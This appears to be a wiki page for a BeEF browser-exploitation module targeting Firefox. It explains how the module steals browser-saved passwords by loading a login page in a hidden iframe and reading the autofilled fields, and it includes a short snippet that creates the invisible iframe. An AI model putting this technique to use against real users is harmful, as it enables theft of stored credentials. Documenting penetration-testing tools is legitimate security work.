## Summary
* **Objective**: Extract credentials saved in the browser
* **Authors**: bcoles
* **Browsers**: Firefox
* [[Code|https://github.com/beefproject/beef/tree/master/modules/browser/hooked_domain/get_stored_credentials]]

## Internal Working

This module tries to extract passwords saved in the browser by creating an iframe of the provided login_url, waiting for any password fields to be auto-filled by the browser, and then extracting it.

```js
iframe = document.createElement("iframe");
iframe.setAttribute("id","credentials_container_<%= @command_id %>");
iframe.setAttribute("src", login_url);
iframe.setAttribute("style","display:none;visibility:hidden;border:none;height:0;width:0;");
document.body.appendChild(iframe);
```



## Feedback